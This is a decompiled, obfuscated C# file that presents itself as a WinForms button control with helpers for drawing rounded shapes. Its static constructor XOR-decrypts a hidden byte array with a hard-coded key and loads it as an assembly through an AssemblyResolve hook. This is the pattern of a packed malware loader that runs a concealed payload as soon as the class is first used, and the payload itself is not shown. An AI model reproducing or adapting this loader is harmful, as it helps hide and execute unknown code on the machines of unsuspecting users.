using System;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using Fm;
using ns0;

namespace ns1;

internal sealed class Class1 : Button
{
	public enum Enum2 : byte
	{
		const_0,
		const_1,
		const_2
	}

	public enum Enum3 : byte
	{
		const_0,
		const_1,
		const_2,
		const_3
	}

	internal static class Class2
	{
		public static bool smethod_0(Type type_0)
		{
			return type_0.IsEnum;
		}

		public static bool smethod_1(Type type_0)
		{
			return type_0.IsAbstract;
		}

		public static bool smethod_2(Type type_0)
		{
			return type_0.IsSealed;
		}

		public static Type smethod_3(Type type_0)
		{
			return type_0.BaseType;
		}

		public static Assembly smethod_4(Type type_0)
		{
			return type_0.Assembly;
		}

		public static TypeCode smethod_5(Type type_0)
		{
			return Type.GetTypeCode(type_0);
		}

		public static bool smethod_6(Assembly assembly_0)
		{
			return assembly_0.ReflectionOnly;
		}
	}

	internal static byte[] byte_0;

	internal static byte[] byte_1;

	private static int smethod_0(byte[] EqOpugl7gOg0vQjddUChEQRwU2RO0Hk7EldmYyIWJa2TToCESmleond6Y5HtyA0sxpCvyBEZH7zR9QTm4gTekTjum8Dg3uLqu3m6Wb3NMbXilz5ena8MOLfOJE0KjhVBCrMT)
	{
		return EqOpugl7gOg0vQjddUChEQRwU2RO0Hk7EldmYyIWJa2TToCESmleond6Y5HtyA0sxpCvyBEZH7zR9QTm4gTekTjum8Dg3uLqu3m6Wb3NMbXilz5ena8MOLfOJE0KjhVBCrMT.Length;
	}

	static Class1()
	{
		byte_0 = ActivationArguments.smethod_0();
		byte_1 = new byte[25]
		{
			212, 215, 86, 8, 23, 44, 142, 170, 104, 178,
			138, 204, 21, 45, 160, 35, 85, 189, 184, 47,
			53, 56, 201, 41, 98
		};
		for (int i = 0; i < smethod_0(byte_0); i++)
		{
			byte_0[i] = (byte)(byte_0[i] ^ byte_1[i % byte_1.Length]);
		}
		AppDomain.CurrentDomain.AssemblyResolve += (object object_0, ResolveEventArgs resolveEventArgs_0) => ((AppDomain)object_0).Load(byte_0);
	}

	public static void smethod_1(Graphics graphics_0, Rectangle rectangle_0, int int_0, Brush brush_0)
	{
		graphics_0.FillPie(brush_0, rectangle_0.X, rectangle_0.Y, int_0, int_0, 180, 90);
		graphics_0.FillPie(brush_0, rectangle_0.X + rectangle_0.Width - int_0, rectangle_0.Y, int_0, int_0, 270, 90);
		graphics_0.FillPie(brush_0, rectangle_0.X, rectangle_0.Y + rectangle_0.Height - int_0, int_0, int_0, 90, 90);
		graphics_0.FillPie(brush_0, rectangle_0.X + rectangle_0.Width - int_0, rectangle_0.Y + rectangle_0.Height - int_0, int_0, int_0, 0, 90);
		graphics_0.FillRectangle(brush_0, Convert.ToInt32(rectangle_0.X + int_0 / 2), rectangle_0.Y, rectangle_0.Width - int_0, Convert.ToInt32(int_0 / 2));
		graphics_0.FillRectangle(brush_0, rectangle_0.X, Convert.ToInt32(rectangle_0.Y + int_0 / 2), rectangle_0.Width, rectangle_0.Height - int_0);
		graphics_0.FillRectangle(brush_0, Convert.ToInt32(rectangle_0.X + int_0 / 2), Convert.ToInt32(rectangle_0.Y + rectangle_0.Height - int_0 / 2), rectangle_0.Width - int_0, Convert.ToInt32(int_0 / 2));
	}

	public static void Eavt2DRIzgtIXfK1hDTXZv1Ytwcek2zJLQADcjJ48i8UBzidUhgj5CR26TBcWHf1uSC7mBy2kncL2SvjWyj9u6Ul8NmFfzydtJiFex5Pi30e6zqcMRibD2PJ4a6IKfg9ppfu(Graphics graphics_0, Rectangle rectangle_0, int int_0, Pen pen_0)
	{
		graphics_0.DrawArc(pen_0, rectangle_0.X, rectangle_0.Y, int_0, int_0, 180, 90);
		graphics_0.DrawLine(pen_0, Convert.ToInt32(rectangle_0.X + int_0 / 2), rectangle_0.Y, Convert.ToInt32(rectangle_0.X + rectangle_0.Width - int_0 / 2), rectangle_0.Y);
		graphics_0.DrawArc(pen_0, rectangle_0.X + rectangle_0.Width - int_0, rectangle_0.Y, int_0, int_0, 270, 90);
		graphics_0.DrawLine(pen_0, rectangle_0.X, Convert.ToInt32(rectangle_0.Y + int_0 / 2), rectangle_0.X, Convert.ToInt32(rectangle_0.Y + rectangle_0.Height - int_0 / 2));
		graphics_0.DrawLine(pen_0, Convert.ToInt32(rectangle_0.X + rectangle_0.Width), Convert.ToInt32(rectangle_0.Y + int_0 / 2), Convert.ToInt32(rectangle_0.X + rectangle_0.Width), Convert.ToInt32(rectangle_0.Y + rectangle_0.Height - int_0 / 2));
		graphics_0.DrawLine(pen_0, Convert.ToInt32(rectangle_0.X + int_0 / 2), Convert.ToInt32(rectangle_0.Y + rectangle_0.Height), Convert.ToInt32(rectangle_0.X + rectangle_0.Width - int_0 / 2), Convert.ToInt32(rectangle_0.Y + rectangle_0.Height));
		graphics_0.DrawArc(pen_0, rectangle_0.X, rectangle_0.Y + rectangle_0.Height - int_0, int_0, int_0, 90, 90);
		graphics_0.DrawArc(pen_0, rectangle_0.X + rectangle_0.Width - int_0, rectangle_0.Y + rectangle_0.Height - int_0, int_0, int_0, 0, 90);
	}

	[STAThread]
	private static void Main()
	{
		Program.Main();
	}

	public static void smethod_2(Graphics graphics_0, Rectangle rectangle_0, Enum3 enum3_0, Color color_0)
	{
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		int num = rectangle_0.Width / 2;
		int num2 = rectangle_0.Height / 2;
		Point point = Point.Empty;
		Point point2 = Point.Empty;
		Point point3 = Point.Empty;
		switch (enum3_0)
		{
		case Enum3.const_0:
			point = new Point(rectangle_0.Left + num, rectangle_0.Top);
			point2 = new Point(rectangle_0.Left, rectangle_0.Bottom);
			point3 = new Point(rectangle_0.Right, rectangle_0.Bottom);
			break;
		case Enum3.const_1:
			point = new Point(rectangle_0.Left + num, rectangle_0.Bottom);
			point2 = new Point(rectangle_0.Left, rectangle_0.Top);
			point3 = new Point(rectangle_0.Right, rectangle_0.Top);
			break;
		case Enum3.const_2:
			point = new Point(rectangle_0.Left, rectangle_0.Top + num2);
			point2 = new Point(rectangle_0.Right, rectangle_0.Top);
			point3 = new Point(rectangle_0.Right, rectangle_0.Bottom);
			break;
		case Enum3.const_3:
			point = new Point(rectangle_0.Right, rectangle_0.Top + num2);
			point2 = new Point(rectangle_0.Left, rectangle_0.Bottom);
			point3 = new Point(rectangle_0.Left, rectangle_0.Top);
			break;
		}
		SolidBrush val = new SolidBrush(color_0);
		try
		{
			graphics_0.FillPolygon((Brush)(object)val, new Point[3] { point, point2, point3 });
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
